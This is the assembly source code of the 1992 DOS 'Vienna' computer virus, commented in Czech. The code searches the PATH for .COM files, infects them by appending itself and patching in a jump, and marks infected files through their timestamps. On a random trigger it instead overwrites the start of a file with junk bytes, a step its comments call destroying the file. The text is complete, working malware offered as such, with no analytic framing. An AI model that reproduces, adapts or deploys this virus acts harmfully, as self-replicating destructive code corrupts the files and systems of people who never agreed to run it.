

;
NAME    RAM
PAGE    63,130
;*************************************
;*                                   *
;*           VIR IBM PC              *
;*				     *
;*         VIENNA VIOLATOR           *
;*                                   *
;*************************************
;*  odtajnil: Michal    M E R T A    *
;*      SATELITE LTD.1992            *
;*************************************
;
cseg    segment para public 'code'
        ASSUME CS:CSEG,DS:CSEG
STAR:   ORG    100H
s1:     JMP    START                      ; SKOC DO VIRU
        MOV    AX,4C00H                   ; EXIT
        INT    21H
;
START:  PUSH   CX
        MOV    DX,OFFSET ZACDAT           ;ADRESA DAT
        CLD
        MOV    SI,DX
        ADD    SI,WORD PTR 10
        MOV    DI,0100h                   ;na zacatek
        MOV    CX,0003h                   ;v delce tri
        REP    MOVSB                      ;presun prvni instrukci
        MOV    SI,DX                      ;adresa dat
        MOV    AH,30h
        INT    21h                        ;zjisti DOS verzi
        CMP    AL,00h                     ; AL=verze DOS
        JNZ    DAL1                       ;byl nalezen system
        JMP    KONEC                      ;bez na konec
;----------------------------------------------
DAL1:   PUSH   ES
        MOV    AH,2Fh
        INT    21h                        ;DTA Address
        MOV    [SI+WORD PTR ZAC],BX
        MOV    [SI+WORD PTR DVE],ES
;
;ES:BX -> adresa pameti pro diskove operace
;
        POP    ES                         ;obnov puvodni hodnotu
        MOV    DX,005Fh                   ;nase DTA je na konci
        NOP
;
;DS:DX -> adresa pameti pro diskove operace
;
        ADD    DX,SI
        MOV    AH,1Ah
        INT    21h                        ;Set DTA
        PUSH   ES
        PUSH   SI
;
; do ES presunu bazovou adresu prostredi
;  z PSP, budeme tam hledat slovo PATH
;
        MOV    ES,[WORD PTR L002Ch]
        MOV    DI,0000h
CYKL1:  POP    SI
        PUSH   SI
;DS:SI - adresa slova PATH
        ADD    SI,WORD PTR 1AH
        LODSB
        MOV    CX,8000h                   ;delka testu
        REPNZ  SCASB                      ;je tam nase pismeno ?
        MOV    CX,0004h                   ;je to PATH  ?
CYKL2:  LODSB
        SCASB
        JNZ    CYKL1
        LOOP   CYKL2
        POP    SI
        POP    ES
        MOV    [SI+WORD PTR L0016h],DI
        MOV    DI,SI
        ADD    DI,WORD PTR 1FH
        MOV    BX,SI
        ADD    SI,WORD PTR 1Fh
        MOV    DI,SI
        JMP    Short H0152B
;----------------------------------------------
CYKL4:  CMP    Word Ptr [SI+L0016h],+00h
        JNZ    H014FB
        JMP    H0165E
;----------------------------------------------
H014FB: PUSH   DS
        PUSH   SI
        MOV    DS,ES:[002Ch]
        MOV    DI,SI
        MOV    SI,ES:[DI+WORD PTR L0016h]
        ADD    DI,WORD PTR 1Fh
CYKL3:  LODSB
        CMP    AL,3Bh
        JZ     H0151C
        CMP    AL,00h
        JZ     H01519
        STOSB
        JMP    Short CYKL3
;----------------------------------------------
H01519: MOV    SI,0000h
H0151C: POP    BX
        POP    DS
        MOV    WORD PTR [BX+L0016h],SI
        CMP    Byte Ptr [DI-1],5Ch        ; "\"
        JZ     H0152B
        MOV    AL,5Ch
        STOSB
H0152B: MOV    WORD PTR [BX+L0018h],DI
        MOV    SI,BX
        ADD    SI,WORD PTR 0010h
        MOV    CX,0006h
        REP    MOVSB                      ;PATH=*.COM
        MOV    SI,BX
        MOV    AH,4Eh
        MOV    DX,001Fh
        NOP
;
;DS:DX -> nazev cesty + jmeno souboru  *.COM
;
        ADD    DX,SI
        MOV    CX,0007h                   ;ATRIBUT - hledej vsechny
        INT    21h                        ;najdi prvni soubor
        JMP    Short H0154F
;----------------------------------------------
hledej: MOV    AH,4Fh
        INT    21h                        ;hledej dalsi soubor
H0154F: JNC    H01553                     ;nasel se
        JMP    Short CYKL4
;----------------------------------------------
H01553: MOV    AX,WORD PTR [SI+OFFSET DTACAS-ZACDAT] ;cas
        AND    AL,1Fh
        CMP    AL,1Fh                     ;byl uz nakazen ?
        JZ     hledej
;porovnej delku
        CMP    Word Ptr [SI+OFFSET DTADELKA-ZACDAT],0FA00h
        JA     hledej
        CMP    Word Ptr [SI+OFFSET DTADELKA-ZACDAT],+0Ah
        JC     hledej
        MOV    DI,WORD PTR [SI+L0018h]
        PUSH   SI
        ADD    SI,WORD PTR 7Dh            ;jmeno z DTA
H01575: LODSB                             ;vytvori jmeno
        STOSB
        CMP    AL,00h
        JNZ    H01575
        POP    SI
        MOV    AX,4300h
        MOV    DX,001Fh
        NOP
;
;DS:DX -> JMENO SOUBORU
;CX       ATRIBUTY
;AL=0     po navratu bude v CX akt. atribut
        ADD    DX,SI
        INT    21h                        ;File Attribute
        MOV    WORD PTR [SI+OFFSET ATRIBUT-ZACDAT],CX
        MOV    AX,4301h
        AND    CX,0FFFEh
        MOV    DX,001Fh                   ;JMENO
        NOP
        ADD    DX,SI
;AL=1  zmena atributu souboru
;
        INT    21h                        ;File Attribute
        MOV    AX,3D02h
        MOV    DX,001Fh
        NOP
;DS:DX -> JMENO SOUBORU
;AL - REZIM OTEVRENI SOUBORU (cteni i zapis)

        ADD    DX,SI
        INT    21h                        ;Open File
        JNC    H015AA                     ;O.K.
        JMP    KONEC2
;----------------------------------------------
H015AA: MOV    BX,AX
        MOV    AX,5700h
        INT    21h                        ;cti cas a datum souboru
        MOV    WORD PTR [SI+OFFSET CAS-ZACDAT],CX    ;cas
        MOV    WORD PTR [SI+OFFSET DATUM-ZACDAT],DX    ;datum
        MOV    AH,2Ch
        INT    21h                        ;vrat systemovy cas
;CH-HODINY
;CL-MINUTY
;DH-SEC
;DL-SETINY
        AND    DH,07h                     ;RANDOM GENERATOR
        JNZ    H015D2
;****
; ZNICIME SOUBOR !!!!!!
;****
        MOV    AH,40h
        MOV    CX,0005h
        MOV    DX,SI
        ADD    DX,008Ah                   ;balast delky 5B
;BX - IDENTIFIKATOR SOUBORU
;DS:DX - ADRESA BUFF
;CX - POCET ZAPIS UDAJU
        INT    21h                        ;Write File/Device
        JMP    Short CHYBAC
;----------------------------------------------
        NOP
H015D2: MOV    AH,3Fh                     ;CTENI
        MOV    CX,0003h                   ;DELKA DAT
        MOV    DX,000Ah
        NOP
        ADD    DX,SI
        INT    21h                        ;Read File/Device
        JC     CHYBAC                     ;CHYBA CTENI
        CMP    AX,0003h
        JNZ    CHYBAC
        MOV    AX,4202h
        MOV    CX,0000h
        MOV    DX,0000h                   ;PRESUN SE NA KONEC
        INT    21h                        ;Move File Pointer
        JC     CHYBAC
        MOV    CX,AX                      ;DELKA SOUBORU
        SUB    AX,0003h                   ; -3
        MOV    WORD PTR [SI+L000Eh],AX    ;PREPIS SKOK I2
        ADD    CX,OFFSET ZACDAT-(START-s1) ; + ZACATEK DAT
        MOV    DI,SI
        SUB    DI,OFFSET ZACDAT-START-2   ;ADRESA START+2
        MOV    [DI],CX                    ;MODIFIKUJ 2. INSTRUKCI
        MOV    AH,40h
        MOV    CX,OFFSET PKONEC-START     ;delka VIRU
        MOV    DX,SI
        SUB    DX,OFFSET ZACDAT-START     ;ds:dx - start adr
        INT    21h                        ;Write File/Device
        JC     CHYBAC
        CMP    AX,OFFSET PKONEC-START     ;ZAPSALO SE TO CELE ?
        JNZ    CHYBAC
        MOV    AX,4200h
        MOV    CX,0000h
        MOV    DX,0000h                   ;presun se na zacatek
        INT    21h                        ;Move File Pointer
        JC     CHYBAC
        MOV    AH,40h
        MOV    CX,0003h                   ;zapis skok do VIRU
        MOV    DX,SI                      ; 3 byte
        ADD    DX,WORD PTR 000Dh
        INT    21h                        ;Write File/Device
CHYBAC: MOV    DX,WORD PTR [SI+OFFSET DATUM-ZACDAT]  ;datum
        MOV    CX,WORD PTR [SI+OFFSET CAS-ZACDAT]    ;cas
        AND    CX,0FFE0h
        OR     CX,001Fh                   ;oznac nakazeni
        MOV    AX,5701h
        INT    21h                        ;File Date & Time
        MOV    AH,3Eh
        INT    21h                        ;Close File Handle
KONEC2: MOV    AX,4301h
        MOV    CX,WORD PTR [SI+OFFSET ATRIBUT-ZACDAT]
        MOV    DX,001Fh
        NOP
        ADD    DX,SI
        INT    21h                        ;zmen atributy souboru
H0165E: PUSH   DS
        MOV    AH,1Ah
        MOV    DX,WORD PTR [SI+ZAC]
        MOV    DS,WORD PTR [SI+DVE]
        INT    21h                        ;Set DTA
        POP    DS
KONEC:  POP    CX
        XOR    AX,AX
        XOR    BX,BX
        XOR    DX,DX
        XOR    SI,SI
        MOV    DI,0100h
        PUSH   DI
        XOR    DI,DI
E:      RET    0FFFFh                     ;vrat se na zacatek
;***********************************************
ZACDAT  EQU  E+3
        DB   80H,0                        ;BX DTA
        DB   73H,09                       ;ES DTA
CAS     DB   046H,65H
DATUM   DB   58H,11
ATRIBUT DB   20H,0                        ;ATRIBUTY
I1      DB   90H,90H,90H                  ;PUVODNI INSTRUKCE
I2      DB   0E9H,90H,90H                 ;PREPISUJICI SKOK
        DB   '*.COM',0,1CH,0,24H,10H
        DB   'PATH='
        DB   'FDOC.COM',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
        DB   '                                        '
DTA     DB   3                            ;CISLO ZARIZENI (3->C)
        DB   3FH,3FH,3FH,3FH,3FH,3FH,3FH,3FH,'COM',3,7,0,23H,0,0,0,0,0
        DB   20H                          ;ATRIBUT SOUBORU
DTACAS  DB   0,0                          ;CAS VYTVORENI
        DB   0,0                          ;DATUM
DTADELKA DB  0,0                          ;NIZSI CAST VELIKOSTI SOUBORU
        DB   0,0                          ;VYSSI CAST VELIKOSTI SOUBORU
        DB   'FDOC.COM',0,4FH,4DH,0,0  ;JMENO
        DB   0EAH,0F0H                    ;SI+8Ah    balast
NIC     DB   0FFH,0,0F0H
PKONEC  EQU  NIC+3
ZAC     EQU  STAR+0
DVE     EQU  STAR+2
L002CH  EQU  STAR+2CH
L0016H  EQU  STAR+16H
L0018H  EQU  STAR+18H
L000EH  EQU  STAR+0EH
cseg    ends
        end    S1

